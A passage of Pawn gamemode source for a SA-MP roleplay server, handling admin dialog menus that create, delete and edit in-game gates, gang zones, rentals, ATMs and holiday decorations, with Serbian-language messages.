						presentsInfo[ i ][ presObject ] = CreateDynamicObject( 19054, presentsInfo[ i ][ presPos ][ 0 ]+2, presentsInfo[ i ][ presPos ][ 1 ], presentsInfo[ i ][ presPos ][ 2 ]+0.6, 0.0, 0.0, 0.0 );
     					Streamer_Update( playerid );
						EditDynamicObject( playerid, presentsInfo[ i ][ presObject ] );

						EditPresents[ playerid ] = i;
			 			mSQL_CreatePresent( i );
			 			Iter_Add(iter_Present, i);

					#else

						SendErrorMessage( playerid, "Nije ukljucen XMAS mod." );

					#endif
		        }
		        case 16:
				{
				    #if XMAS_MOD == 1

			            new i = Iter_Free(iter_CTree);

						if( CTree[ (MAX_CTREES-1) ][ ctSQLID ] != 0 ) return SendErrorMessage( playerid, "Ima maksimalno kreiranih jelki." );

		    			new Float:angle;
						GetPlayerPos( playerid, CTree[ i ][ ctPos ][ 0 ], CTree[ i ][ ctPos ][ 1 ], CTree[ i ][ ctPos ][ 2 ]);
						GetPlayerFacingAngle( playerid, angle );

	   					CTree[ i ][ ctPos ][ 3 ] = 0;
	    				CTree[ i ][ ctPos ][ 4 ] = 0;
	    				CTree[ i ][ ctPos ][ 5 ] = 0;
	    				CTree[ i ][ ctPlaced ] = true;

						CTree[ i ][ ctObject ] = CreateDynamicObject( 19076, CTree[ i ][ ctPos ][ 0 ]+2, CTree[ i ][ ctPos ][ 1 ], CTree[ i ][ ctPos ][ 2 ]+0.6, 0.0, 0.0, angle );
	     				Streamer_Update( playerid );
						EditDynamicObject( playerid, CTree[ i ][ ctObject ] );

						EditCTrees[ playerid ] = i;

					#else

						SendErrorMessage( playerid, "Nije ukljucen XMAS mod." );

					#endif
		        }
				case 17:
				{
				    new i = Iter_Free(iter_Rent);
				    
					if( VoziloRentInfo[ MAX_VRENT-1 ][ vrSQLID ] != 0 ) return SendErrorMessage( playerid, "Ima maksimalno kreiranih rentova." );
					if( VoziloRentInfo[i][vrSQLID] != 0 ) return SendErrorMessage( playerid, "ID tog renta vec postoji." );

					new Float:X, Float:Y, Float:Z;
					GetPlayerPos(playerid, X, Y, Z);
					VoziloRentInfo[i][vrLiP_Pos_X] = X;
					VoziloRentInfo[i][vrLiP_Pos_Y] = Y;
					VoziloRentInfo[i][vrLiP_Pos_Z] = Z;
					CreateRentID[ playerid ] = i;

					SendInfoMessage(playerid, "Sada sacuvajte tipkom {FFFFFF}'Y' {4282C0}gdje zelite da bude pozicija za stvaranje vozila.");
				}
			}
		}
	}
	else if(dialogid == dialog_GANGZCOLOR )
	{
	    if( !response ) return 1;
        if( response )
		{
            new color[24], stringic[24];
            if( sscanf( inputtext, "s[24]", color ) ) return ShowPlayerDialog( playerid, dialog_GANGZCOLOR, DIALOG_STYLE_INPUT, D_NASLOV, "{FFFFFF}* Unesite boju za gang zonu.\nPrimer: FF2244", "Potvrdi", "Nazad" );

            new g = Iter_Free(iter_gZone);
            if(g == -1) return SendErrorMessage(playerid, "Ne mozete kreirati vise zona.");

            CreatingGZoneID[ playerid ] = g;

            gZoneInfo[ g ][ gZone_ID ] = -1;

            format( stringic, sizeof( stringic ), "%s", color );
            strmid( gZoneInfo[ g ][ gZoneColor ], stringic, 0, strlen( stringic ), 255 );

            ShowPlayerDialog(playerid, dialog_GANGZISPOPULAR, DIALOG_STYLE_MSGBOX, D_NASLOV, "{FFFFFF}* Unijeli ste boju zone, sada odaberite hoce li zona biti specijalna ili nece:\n\n{FF0000}Ako je zona specijalna organizacije ce dobijati 5x vise novaca u sef.", "Da", "Ne");
        }
	}
	else if(dialogid == dialog_GANGZISPOPULAR) 
	{
		if(!response) 
		{
            new g = Iter_Free(iter_gZone);
            if(g == -1) return SendErrorMessage(playerid, "Ne mozete kreirati vise zona.");

            CreatingGZoneID[ playerid ] = g;
            gZoneInfo[ g ][ gZone_ID ] = -1;
            gZoneInfo[g][gZoneIsSpecial] = 0;

            CreatingGZone[ playerid ] = 1;
		    SendInfoMessage( playerid, "Odabrao si da zona nije specijalna.");
		    SendInfoMessage( playerid, "Koristi {FFFFFF}LMB {4282C0}da postavis pozicije.");
		    SendInfoMessage( playerid, "Prvo sacuvaj poziciju levog donjeg ugla polja.");
		}
		else
		{
            new g = Iter_Free(iter_gZone);
            if(g == -1) return SendErrorMessage(playerid, "Ne mozete kreirati vise zona.");

            CreatingGZoneID[ playerid ] = g;
            gZoneInfo[ g ][ gZone_ID ] = -1;
            gZoneInfo[g][gZoneIsSpecial] = 1;

            CreatingGZone[ playerid ] = 1;
		    SendInfoMessage( playerid, "Odabrao si da je zona specijalna.");
		    SendInfoMessage( playerid, "Koristi {FFFFFF}LMB {4282C0}da postavis pozicije.");
		    SendInfoMessage( playerid, "Prvo sacuvaj poziciju levog donjeg ugla polja.");
		}
	}
	else if(dialogid == dialog_ORGCOLOR )
	{
	    if( !response ) return 1;
        if( response ) 
        {

            new id = GetNearestOrganization( playerid );
            new color[ 24 ], stringic[ 24 ];
            if( sscanf( inputtext, "s[24]", color ) ) ShowPlayerDialog( playerid, dialog_ORGCOLOR, DIALOG_STYLE_INPUT, D_NASLOV, "{FFFFFF}* Unesite boju za organizaciju(Vezano za zone).\nPrimer: FF00FF", "Potvrdi", "Odustani" );

            format( stringic, sizeof( stringic ), "%s", color );
            strmid( org_info[ id ][ oColor ], stringic, 0, strlen( stringic ), 7 );

            new q[ 256 ];
			mysql_format( mSQL, q, sizeof(q), "UPDATE `organizations` SET `color` = '%e' WHERE `org_id` = '%d' LIMIT 1",
				org_info[ id ][ oColor ],
				org_info[ id ][ oID ] );
			mysql_tquery( mSQL, q);

            SendInfoMessage( playerid, "Promenili ste boju organizacije." );
        }
	}
	//
	else if(dialogid == dialog_CREATEGPS )
	{
	    if( !response ) return 1;
        if( response )
        {
			new id = Iter_Free(iter_GPS);

            if( gpsInfo[ (MAX_GPS-1) ][ gpsSQLID ] != 0 ) return SendErrorMessage( playerid, "Vec ima maksimalan broj gpsova." );

			new namegps[ 50 ];
            if( sscanf( inputtext, "s[50]", namegps ) ) return ShowPlayerDialog( playerid, dialog_CREATEGPS, DIALOG_STYLE_INPUT, D_NASLOV, "{FFFFFF}* Unesite ime ovog mesta za gps.", "Potvrdi", "Nazad" );

			GetPlayerPos( playerid, gpsInfo[ id ][ gpsPos ][ 0 ], gpsInfo[ id ][ gpsPos ][ 1 ], gpsInfo[ id ][ gpsPos ][ 2 ] );
			strmid( gpsInfo[ id ][ gpsName ], namegps, 0, strlen( namegps ), 50 );
			mSQL_CreateGPS( id );
			Iter_Add(iter_GPS, id);

			SendInfoMessage( playerid, "Uspesno si kreirao novu gps lokaciju {FFFFFF}'%s'.", namegps );
        }
	}
	else if(dialogid == dialog_CREATEGATE )
	{
	    if( !response ) return 1;
        if( response )
		{
			new g = Iter_Free(iter_Gate);

            if( GateData[ (MAX_GATES-1) ][ gatebaseID ] != 0 ) return SendErrorMessage( playerid, "Vec ima maksimalan broj kapija." );

			new Float:x,
			    	Float:y,
			    		Float:z,
			    			Float:angle,
								model;

            GetPlayerPos( playerid, x, y, z );
            GetPlayerFacingAngle( playerid, angle );

            if( sscanf( inputtext, "i", model ) ) return ShowPlayerDialog( playerid, dialog_CREATEGATE, DIALOG_STYLE_INPUT, D_NASLOV, "{FFFFFF}* Unesite id objekta kapije.", "Potvrdi", "Nazad" );

            GateData[ g ][ gatebaseID ] = -1;
            GateData[ g ][ gateFor ] = 0;
            GateData[ g ][ gateOrgID ] = -1;
            GateData[ g ][ gateModel ] = model;
			GateData[ g ][ gateSpeed ] = 3.0;
			GateData[ g ][ gateRadius ] = 8.0;
			GateData[ g ][ gateOpened ] = false;
			GateData[ g ][ gateTime ] = 0;

			GateData[ g ][ gatePos ][ 0 ] = x + ( 3.0 * floatsin( -angle, degrees ) );
			GateData[ g ][ gatePos ][ 1 ] = y + ( 3.0 * floatcos( -angle, degrees ) );
			GateData[ g ][ gatePos ][ 2 ] = z;
			GateData[ g ][ gatePos ][ 3 ] = 0.0;
			GateData[ g ][ gatePos ][ 4 ] = 0.0;
			GateData[ g ][ gatePos ][ 5 ] = angle;

			GateData[ g ][ gateMove ][ 0 ] = 0.0;
			GateData[ g ][ gateMove ][ 1 ] = 0.0;
			GateData[ g ][ gateMove ][ 2 ] = 0.0;
			GateData[ g ][ gateMove ][ 3 ] = 0.0;
			GateData[ g ][ gateMove ][ 4 ] = 0.0;
			GateData[ g ][ gateMove ][ 5 ] = 0.0;

            GateData[ g ][ gateInterior ] = GetPlayerInterior( playerid );
            GateData[ g ][ gateWorld ] = GetPlayerVirtualWorld( playerid );

            SendInfoMessage(playerid, "Sada sacuvajte poziciju zatvorene kapije.");
            GateData[ g ][ gateObject ] = CreateDynamicObject( GateData[ g ][ gateModel ], GateData[ g ][ gatePos ][ 0 ], GateData[ g ][ gatePos ][ 1 ], GateData[ g ][ gatePos ][ 2 ], GateData[ g ][ gatePos ][ 3 ], GateData[ g ][ gatePos ][ 4 ], GateData[ g ][ gatePos ][ 5 ], GateData[ g ][ gateWorld ], GateData[ g ][ gateInterior ] );
            Streamer_Update( playerid );
			EditDynamicObject( playerid, GateData[ g ][ gateObject ] );
            EditDGate[ playerid ] = g;
		}
	}
	else if(dialogid == dialog_CREATEGATE_2 )
	{
	    if( !response ) return 1;
        if( response )
		{
            new g = EditDGate[ playerid ], Float:speed;
            if( sscanf( inputtext, "f", speed ) ) return ShowPlayerDialog( playerid, dialog_CREATEGATE_2, DIALOG_STYLE_INPUT, D_NASLOV, "{FFFFFF}* Unesite brzinu zatvaranja i otvaranja kapije(0 > 20.0).", "Potvrdi", "Nazad" );
            if( speed < 0.0 || speed > 20.0 ) return ShowPlayerDialog( playerid, dialog_CREATEGATE_2, DIALOG_STYLE_INPUT, D_NASLOV, "{FFFFFF}* Unesite brzinu zatvaranja i otvaranja kapije{FF0000}(0 > 20.0).", "Potvrdi", "Nazad" );

            GateData[ g ][ gateSpeed ] = speed;

            ShowPlayerDialog( playerid, dialog_CREATEGATE_3, DIALOG_STYLE_INPUT, D_NASLOV, "{FFFFFF}* Unesite vreme posle koliko sekundi ce se zatvoriti kapija.", "Potvrdi", "Nazad" );
		}
	}
	else if(dialogid == dialog_CREATEGATE_3 )
	{
	    if( !response ) return 1;
        if( response )
		{
            new g = EditDGate[ playerid ], brzina;
            if( sscanf( inputtext, "i", brzina ) ) return ShowPlayerDialog( playerid, dialog_CREATEGATE_3, DIALOG_STYLE_INPUT, D_NASLOV, "{FFFFFF}* Unesite vreme posle koliko sekundi ce se zatvoriti kapija.", "Potvrdi", "Nazad" );
            if( brzina < 0 || brzina > 60 ) return ShowPlayerDialog( playerid, dialog_CREATEGATE_3, DIALOG_STYLE_INPUT, D_NASLOV, "{FFFFFF}* Unesite vreme posle koliko sekundi ce se zatvoriti kapija.{FF0000}(0 > 60sec)", "Potvrdi", "Nazad" );

            GateData[ g ][ gateTime ] = brzina*1000;

            ShowPlayerDialog( playerid, dialog_CREATEGATE_5, DIALOG_STYLE_LIST, D_NASLOV,
																							"{4282C0}(1). {FFFFFF}Organizacija\n\
																							{4282C0}(2). {FFFFFF}Igrac\n\
																							{4282C0}(3). {FFFFFF}Admin\n\
																							{4282C0}(4). {FFFFFF}Gamemaster\n\
																							{4282C0}(5). {FFFFFF}VIP\n\
																							{4282C0}(6). {FFFFFF}Spec Admin\n\
																							{4282C0}(7). {FFFFFF}Promoter\n\
																							{4282C0}(8). {FFFFFF}Putarina", "Izaberi", "Odustani" );
		}
	}
	else if(dialogid == dialog_CREATEGATE_4 )
	{
	    if( !response ) return 1;
        if( response )
		{
            new g = EditDGate[ playerid ], ime[ MAX_PLAYER_NAME ];
            if( sscanf( inputtext, "s[24]", ime ) ) return ShowPlayerDialog( playerid, dialog_CREATEGATE_4, DIALOG_STYLE_INPUT, D_NASLOV, "{FFFFFF}* Unesite ime igraca koji moze kontrolisati ovu kapiju(FORMAT:Ime_Prezime).", "Potvrdi", "Nazad" );

			strmid( GateData[ g ][ gateOwner ], ime, 0, strlen( ime ), MAX_PLAYER_NAME );
			sql_create_gate( g );

			SCMF( playerid, 0x4282C0FF, "Uspesno ste zavrsili kreiranje kapije za igraca %s.", ime );
		}
	}
	else if(dialogid == dialog_CREATEGATE_5 )
	{
	    if( !response ) return 1;
        if( response )
		{
	    	new g = EditDGate[ playerid ];

		    switch( listitem )
			{
		        case 0:
				{
		            GateData[ g ][ gateFor ] = 1;

		            ShowPlayerDialog( playerid, dialog_CREATEGATE_6, DIALOG_STYLE_INPUT, D_NASLOV, "{FFFFFF}* Unesite id organizacije za koju pravite kapiju.", "Potvrdi", "Nazad" );
		        }
		        case 1:
				{
		            GateData[ g ][ gateFor ] = 2;
		            ShowPlayerDialog( playerid, dialog_CREATEGATE_4, DIALOG_STYLE_INPUT, D_NASLOV, "{FFFFFF}* Unesite ime igraca koji moze kontrolisati ovu kapiju(FORMAT:Ime_Prezime).", "Potvrdi", "Nazad" );
				}
				case 2:
				{
				    GateData[ g ][ gateFor ] = 3;
		            sql_create_gate( g );
		            SendInfoMessage(playerid, "Uspesno ste zavrsili kreiranje kapije za admine." );
		        }
		        case 3:
				{
				    GateData[ g ][ gateFor ] = 4;
		            sql_create_gate( g );
		            SendInfoMessage(playerid, "Uspesno ste zavrsili kreiranje kapije za gamemastere." );
		        }
		        case 4:
				{
				    GateData[ g ][ gateFor ] = 5;
		            sql_create_gate( g );
		            SendInfoMessage(playerid, "Uspesno ste zavrsili kreiranje kapije za vipove." );
		        }
		        case 5:
				{
				    GateData[ g ][ gateFor ] = 6;
		            sql_create_gate( g );
		            SendInfoMessage(playerid, "Uspesno ste zavrsili kreiranje kapije za Spec Admine." );
		        }
		        case 6:
				{
				    GateData[ g ][ gateFor ] = 7;
		            sql_create_gate( g );
		            SendInfoMessage(playerid, "Uspesno ste zavrsili kreiranje kapije za Promotera." );
		        }
		        case 7:
				{
				    GateData[ g ][ gateFor ] = 8;
		            sql_create_gate( g );
		            SendInfoMessage(playerid, "Uspesno ste zavrsili kreiranje kapije za putarinu." );
		        }
			}
		}
	}
	else if(dialogid == dialog_CREATEGATE_6 )
	{
	    if( !response ) return 1;
        if( response )
		{
            new g = EditDGate[ playerid ], orga;
            if( sscanf( inputtext, "d", orga ) ) return ShowPlayerDialog( playerid, dialog_CREATEGATE_6, DIALOG_STYLE_INPUT, D_NASLOV, "{FFFFFF}* Unesite id organizacije za koju pravite kapiju.", "Potvrdi", "Nazad" );

			GateData[ g ][ gateOrgID ] = orga;
			sql_create_gate( g );

			SendInfoMessage(playerid, "Uspesno ste zavrsili kreiranje kapije za organizaciju {FFFFFF}%s.", getOrgName( orga ) );
		}
	}
	else if(dialogid == dialog_IZBRISISVE )
	{
		if(!response)
		{
			ShowPlayerDialog( playerid, dialog_SERVERMI, DIALOG_STYLE_TABLIST_HEADERS, D_NASLOV,
																								"#\tOpcija\n\
																								{4282C0}(1).\t{FFFFFF}Upravljanje serverom\n\
																								{4282C0}(2).\t{FFFFFF}Napravi\n\
																								{4282C0}(3).\t{FFFFFF}Izbrisi\n\
																								{4282C0}(4).\t{FFFFFF}Izmeni\n\
																								{4282C0}(5).\t{FFFFFF}Spisak organizacija", "Odaberi", "Odustani" );
		}
        if( response )
		{
 			switch(listitem)
			{
			    case 0: ShowPlayerDialog( playerid, dialog_ORGDELETE, DIALOG_STYLE_INPUT, D_NASLOV, "{FFFFFF}* Unesite id organizacije koju zelite obrisati!", "Potvrdi", "Odustani" );
		        case 1: ShowPlayerDialog( playerid, dialog_FDELETE, DIALOG_STYLE_INPUT, D_NASLOV, "{FFFFFF}* Unesite id firme koju zelite obrisati!", "Potvrdi", "Odustani" );
		        case 2: ShowPlayerDialog( playerid, dialog_IMDELETE, DIALOG_STYLE_INPUT, D_NASLOV, "{FFFFFF}* Unesite id imovine koju zelite obrisati!", "Potvrdi", "Odustani" );
	            case 3:
				{
	                if( GetNearestContainer( playerid ) == -1 ) return SendErrorMessage( playerid, "Moras biti blizu kontejnera." );
					new i = GetNearestContainer( playerid );

					if( IsValidDynamicObject( KontInfo[ i ][ koObjID ] ) ) DestroyDynamicObject( KontInfo[ i ][ koObjID ] );

			    	KontInfo[ i ][ koObjPos ][ 0 ] = 0;
	    			KontInfo[ i ][ koObjPos ][ 1 ] = 0;
	    			KontInfo[ i ][ koObjPos ][ 2 ] = 0;
	    			KontInfo[ i ][ koObjRot ][ 0 ] = 0;
	    			KontInfo[ i ][ koObjRot ][ 1 ] = 0;
	    			KontInfo[ i ][ koObjRot ][ 2 ] = 0;

					static q[120];
					mysql_format(mSQL, q, 120, "DELETE FROM `containers` WHERE `koSQLID` = '%d'", KontInfo[i][koSQLID]);
					mysql_tquery(mSQL, q);

					Iter_Remove(iter_Kont, i);

		            SendInfoMessage( playerid, "Obrisao si kontejner ID {FFFFFF}(%d).", KontInfo[i][koSQLID] );
				}
				case 4:
				{
	    			if( !IsPlayerInAnyVehicle( playerid ) ) return SendErrorMessage( playerid, "Niste u vozilu!" );
	    			if( VehicleInfo[ GetPlayerVehicleID( playerid ) ][ vSqlID ] == 0 ) return SendErrorMessage( playerid, "Da bi koristili ovu komandu morate biti u server side vozilu." );

	                new vehicleid = GetPlayerVehicleID( playerid );

				    SMG_DestroyVehicle( vehicleid );
					sql_vehicles_delete( vehicleid );
					ResetVehicle( vehicleid );

					SendInfoMessage( playerid, "Obrisao si vozilo ID {FFFFFF}(%d).", vehicleid );
				}
				case 5:
				{
	                if( GetNearestAtm( playerid ) == -1 ) return SendErrorMessage( playerid, "Moras biti blizu bankomata." );
					new i = GetNearestAtm( playerid );

					if( IsValidDynamicObject( atmInfo[ i ][ atmObject ] ) ) DestroyDynamicObject( atmInfo[ i ][ atmObject ] );
	                if( IsValidDynamic3DTextLabel( atmInfo[ i ][ atmText3D ] ) ) DestroyDynamic3DTextLabel( atmInfo[ i ][ atmText3D ] );

			    	atmInfo[ i ][ atmPos ][ 0 ] = 0;
	    			atmInfo[ i ][ atmPos ][ 1 ] = 0;
	    			atmInfo[ i ][ atmPos ][ 2 ] = 0;
	    			atmInfo[ i ][ atmPos ][ 3 ] = 0;
	    			atmInfo[ i ][ atmPos ][ 4 ] = 0;
	    			atmInfo[ i ][ atmPos ][ 5 ] = 0;
	    			atmInfo[ i ][ atmPreseceneZice ] = false;
	    			atmInfo[ i ][ atmProbijenBios ] = false;
	    			atmInfo[ i ][ atmVremeDoRoba ] = 0;

					static q[120];
					mysql_format(mSQL, q, 120, "DELETE FROM `atms` WHERE `atmSQLID` = '%d'", atmInfo[i][atmSQLID]);
					mysql_tquery(mSQL, q);

					Iter_Remove(iter_ATM, i);

		            SendInfoMessage( playerid, "Obrisao si bankomat ID {FFFFFF}(%d).", atmInfo[i][atmSQLID] );
				}
				case 6: SendErrorMessage(playerid, "Ovdje nema nista."); 
				case 7:
				{
	                if( NearestGate( playerid ) == -1 ) return SendErrorMessage( playerid, "Moras biti pored kapije." );
					new g = NearestGate( playerid );

					if( IsValidDynamicObject( GateData[ g ][ gateObject ] ) ) DestroyDynamicObject( GateData[ g ][ gateObject ] );

				    new query[ 128 ];
					mysql_format( mSQL, query, sizeof( query ), "DELETE FROM `gates` WHERE `gateid` = '%d'", GateData[ g ][ gatebaseID ] );
					mysql_tquery( mSQL, query );

					Iter_Remove(iter_Gate, g);

				    SendInfoMessage( playerid, "Obrisao si kapiju ID {FFFFFF}(%d).", GateData[ g ][ gatebaseID ] );

				    GateData[ g ][ gatebaseID ] = 0;
		            GateData[ g ][ gateFor ] = 0;
		            GateData[ g ][ gateOrgID ] = 0;
		            GateData[ g ][ gateModel ] = 0;
					GateData[ g ][ gateSpeed ] = 0.0;
					GateData[ g ][ gateRadius ] = 0.0;
					GateData[ g ][ gateOpened ] = false;
					GateData[ g ][ gateTime ] = 0;

	                strmid( GateData[ g ][ gateOwner ], "", 0, strlen( "" ), MAX_PLAYER_NAME );

					GateData[ g ][ gatePos ][ 0 ] = 0.0;
					GateData[ g ][ gatePos ][ 1 ] = 0.0;
					GateData[ g ][ gatePos ][ 2 ] = 0.0;
					GateData[ g ][ gatePos ][ 3 ] = 0.0;
					GateData[ g ][ gatePos ][ 4 ] = 0.0;
					GateData[ g ][ gatePos ][ 5 ] = 0.0;

					GateData[ g ][ gateMove ][ 0 ] = 0.0;
					GateData[ g ][ gateMove ][ 1 ] = 0.0;
					GateData[ g ][ gateMove ][ 2 ] = 0.0;
					GateData[ g ][ gateMove ][ 3 ] = 0.0;
					GateData[ g ][ gateMove ][ 4 ] = 0.0;
					GateData[ g ][ gateMove ][ 5 ] = 0.0;

		            GateData[ g ][ gateInterior ] = 0;
		            GateData[ g ][ gateWorld ] = 0;
				}
				case 8:
				{
	                SendErrorMessage(playerid, "Ne koristi se.");
				}
				case 9:
				{
				    if( GetNearestGZone( playerid ) == -1 ) return SendErrorMessage( playerid, "Moras biti u teritoriji." );
					new id = GetNearestGZone( playerid );

					if( IsValidDynamicPickup( gZoneInfo[ id ][ gZonePickup ] ) ) DestroyDynamicPickup( gZoneInfo[ id ][ gZonePickup ] );
				    if( IsValidDynamic3DTextLabel( gZoneInfo[ id ][ gZone3D ] ) ) DestroyDynamic3DTextLabel( gZoneInfo[ id ][ gZone3D ] );
	                if( IsValidDynamicArea( gZoneInfo[ id ][ gZoneRectAngle ] ) ) DestroyDynamicArea( gZoneInfo[ id ][ gZoneRectAngle ] );

			    	new query[ 128 ];
					mysql_format( mSQL, query, sizeof( query ), "DELETE FROM `gangzones` WHERE `gzone_id` = '%d'", gZoneInfo[ id ][ gZone_ID ] );
					mysql_tquery( mSQL, query);

					Iter_Remove(iter_gZone, id);

					gZoneInfo[ id ][ gZone_ID ] = 0;
				    GZone_Reset( id );

				    HideZoneForAll(gZoneInfo[ id ][ gZoneID ]);
				    DestroyZone(gZoneInfo[ id ][ gZoneID ]);
				    DestroyZoneNumber(gZoneInfo[ id ][ gZoneID ]);
				    DestroyZoneBorders(gZoneInfo[ id ][ gZoneID ]);

				    SendInfoMessage( playerid, "Obrisao si gangzonu ID {FFFFFF}(%d).", id );
				}
				case 10:
				{
	                if( GetNearestPresent( playerid ) == -1 ) return SendErrorMessage( playerid, "Moras biti blizu poklona." );
					new i = GetNearestPresent( playerid );

					if( IsValidDynamicObject( presentsInfo[ i ][ presObject ] ) ) DestroyDynamicObject( presentsInfo[ i ][ presObject ] );
	                if( IsValidDynamic3DTextLabel( presentsInfo[ i ][ pres3d ] ) ) DestroyDynamic3DTextLabel( presentsInfo[ i ][ pres3d ] );

			    	presentsInfo[ i ][ presPos ][ 0 ] = 0;
	    			presentsInfo[ i ][ presPos ][ 1 ] = 0;
	    			presentsInfo[ i ][ presPos ][ 2 ] = 0;
	    			presentsInfo[ i ][ presPos ][ 3 ] = 0;
	    			presentsInfo[ i ][ presPos ][ 4 ] = 0;
	    			presentsInfo[ i ][ presPos ][ 5 ] = 0;
	    			presentsInfo[ i ][ presTaken ] = true;
	    			presentsInfo[ i ][ presPlaced ] = false;

	    			static q[120];
	    			mysql_format(mSQL, q, 120, "DELETE FROM `xmas_presents` WHERE `presSQLID` = '%d'", presentsInfo[i][presSQLID]);
	    			mysql_tquery(mSQL, q);

	    			Iter_Remove(iter_Present, i);

		            SendInfoMessage( playerid, "Obrisao si poklon ID {FFFFFF}(%d).", i );
				}
				case 11:
				{
	                if( GetNearestCTree( playerid ) == -1 ) return SendErrorMessage( playerid, "Moras biti blizu jelke." );
					new i = GetNearestCTree( playerid );

					if( IsValidDynamicObject( CTree[ i ][ ctObject ] ) ) DestroyDynamicObject( CTree[ i ][ ctObject ] );
	                if( IsValidDynamic3DTextLabel( CTree[ i ][ ct3d ] ) ) DestroyDynamic3DTextLabel( CTree[ i ][ ct3d ] );

			    	CTree[ i ][ ctPos ][ 0 ] = 0;
	    			CTree[ i ][ ctPos ][ 1 ] = 0;
	    			CTree[ i ][ ctPos ][ 2 ] = 0;
	    			CTree[ i ][ ctPos ][ 3 ] = 0;
	    			CTree[ i ][ ctPos ][ 4 ] = 0;
	    			CTree[ i ][ ctPos ][ 5 ] = 0;
	    			CTree[ i ][ ctPlaced ] = false;

	    			static q[130];
	    			mysql_format(mSQL, q, sizeof(q), "DELETE FROM `xmas_trees` WHERE `ctSQLID` = '%d'", CTree[i][ctSQLID]);
	    			mysql_tquery(mSQL, q);

	    			Iter_Remove(iter_CTree, i);

		            SendInfoMessage( playerid, "Obrisao si jelku ID {FFFFFF}(%d).", i );
				}
				case 12:
				{
	                if( GetNearestRentVehicle( playerid ) == -1 ) return SendErrorMessage( playerid, "Moras biti blizu renta." );
					new i = GetNearestRentVehicle( playerid );

					if( IsValidDynamicPickup( VoziloRentInfo[ i ][ VoziloRentPickup ] ) ) DestroyDynamicPickup( VoziloRentInfo[ i ][ VoziloRentPickup ] );
	                if( IsValidDynamic3DTextLabel( VoziloRentInfo[ i ][ VoziloRentLabel ] ) ) DestroyDynamic3DTextLabel( VoziloRentInfo[ i ][ VoziloRentLabel ] );

			    	VoziloRentInfo[i][vrLiP_Pos_X] = 0;
					VoziloRentInfo[i][vrLiP_Pos_Y] = 0;
					VoziloRentInfo[i][vrLiP_Pos_Z] = 0;

	    			static q[130];
	    			mysql_format(mSQL, q, sizeof(q), "DELETE FROM `rents` WHERE `vrSQLID` = '%d'", VoziloRentInfo[ i ][ vrSQLID ]);
	    			mysql_tquery(mSQL, q);
	    			
	    			Iter_Remove(iter_Rent, i);

		            SendInfoMessage( playerid, "Obrisao si rent ID {FFFFFF}(%d).", i );
				}
			}
		}
	}
	else if(dialogid == dialog_IZMENISVE )
	{
		if(!response)
		{
			ShowPlayerDialog( playerid, dialog_SERVERMI, DIALOG_STYLE_TABLIST_HEADERS, D_NASLOV,
																								"#\tOpcija\n\
																								{4282C0}(1).\t{FFFFFF}Upravljanje serverom\n\
																								{4282C0}(2).\t{FFFFFF}Napravi\n\
																								{4282C0}(3).\t{FFFFFF}Izbrisi\n\
																								{4282C0}(4).\t{FFFFFF}Izmeni\n\
																								{4282C0}(5).\t{FFFFFF}Spisak organizacija", "Odaberi", "Odustani" );
		}
        if( response )
		{
		    switch(listitem)
		    {
			    case 0: ShowPlayerDialog( playerid, dialog_ORGEDIT, DIALOG_STYLE_LIST, D_NASLOV,
																								"{4282C0}(1). {FFFFFF}Promeni ime\n\
																								{4282C0}(2). {FFFFFF}Promeni interior\n\
																								{4282C0}(3). {FFFFFF}Promeni rankove\n\
																								{4282C0}(4). {FFFFFF}Promeni tip\n\
																								{4282C0}(5). {FFFFFF}Promeni muske skinove\n\
																								{4282C0}(6). {FFFFFF}Promeni skracenicu\n\
																								{4282C0}(7). {FFFFFF}Napravi duty point\n\
																								{4282C0}(8). {FFFFFF}Napravi equipment point\n\
																								{4282C0}(9). {FFFFFF}Promeni zenske skinove\n\
																								{4282C0}(10). {FFFFFF}Promeni max broj clanova\n\
																								{4282C0}(11). {FFFFFF}Kreiraj sef\n\
																								{4282C0}(12). {FFFFFF}Promeni boju orge\n\
																								{4282C0}(13). {FFFFFF}Zakljucaj organizaciju\n\
																								{4282C0}(14). {FFFFFF}Spawn point\n\
																								{4282C0}(15). {FFFFFF}Ulaz iz firme\n\
																								{4282C0}(16). {FFFFFF}Diler\n\
																								{4282C0}(17). {FFFFFF}Port", "Potvrdi", "Odustani" );
		        case 1: ShowPlayerDialog( playerid, dialog_FEDIT, DIALOG_STYLE_LIST, D_NASLOV,
																								"{4282C0}(1). {FFFFFF}Promeni ime\n\
																								{4282C0}(2). {FFFFFF}Otkljucaj firmu\n\
																								{4282C0}(3). {FFFFFF}Zakljucaj firmu\n\
																								{4282C0}(4). {FFFFFF}Prodaj firmu\n\
																								{4282C0}(5). {FFFFFF}Promeni kordinate izlaza\n\
																								{4282C0}(6). {FFFFFF}Promeni vrstu firme", "Potvrdi", "Odustani" );
	            case 2: ShowPlayerDialog( playerid, dialog_VEDIT, DIALOG_STYLE_LIST, D_NASLOV,
																								"{4282C0}(1). {FFFFFF}Promeni cenu\n\
																								{4282C0}(2). {FFFFFF}Parkiraj vozilo\n\
																								{4282C0}(3). {FFFFFF}Prodaj vozilo\n\
																								{4282C0}(4). {FFFFFF}Promeni boju", "Potvrdi", "Odustani" );
	            case 3: ShowPlayerDialog( playerid, dialog_IEDIT, DIALOG_STYLE_LIST, D_NASLOV,
																								"{4282C0}(1). {FFFFFF}Promeni cenu\n\
																								{4282C0}(2). {FFFFFF}Otkljucaj imovinu\n\
																								{4282C0}(3). {FFFFFF}Zakljucaj imovinu\n\
																								{4282C0}(4). {FFFFFF}Prodaj imovinu", "Potvrdi", "Odustani" );
	            case 4: SendErrorMessage(playerid, "Nema ovdje nista.");
	            case 5: SendErrorMessage(playerid, "Nema ovdje nista.");
	            case 6: ShowPlayerDialog( playerid, dialog_GPSEDIT, DIALOG_STYLE_LIST, D_NASLOV, "{4282C0}(1). {FFFFFF}Promeni ime\n{4282C0}(2). {FFFFFF}Promeni poziciju", "Potvrdi", "Odustani" );
				case 7: ShowPlayerDialog( playerid, dialog_AUTOSEDIT, DIALOG_STYLE_LIST, D_NASLOV, "{4282C0}(1). {FFFFFF}Dodaj kolicinu modela\n{4282C0}(2). {FFFFFF}Povezi sa firmom", "Potvrdi", "Odustani" );
	            case 8: ShowPlayerDialog( playerid, dialog_GANGZEDIT, DIALOG_STYLE_LIST, D_NASLOV,
																								"{4282C0}(1). {FFFFFF}Daj vlasnistvo zone orgi\n\
																								{4282C0}(2). {FFFFFF}Da li zona moze da se zauzima?\n\
																								{4282C0}(3). {FFFFFF}Oslobodi zonu\n\
																								{4282C0}(4). {FFFFFF}Promeni boju zone\n\
																								{4282C0}(5). {FFFFFF}Postavi pickup ovde\n\
																								{4282C0}(6). {FFFFFF}Popularna zona", "Potvrdi", "Odustani" );
			}
		}
	}
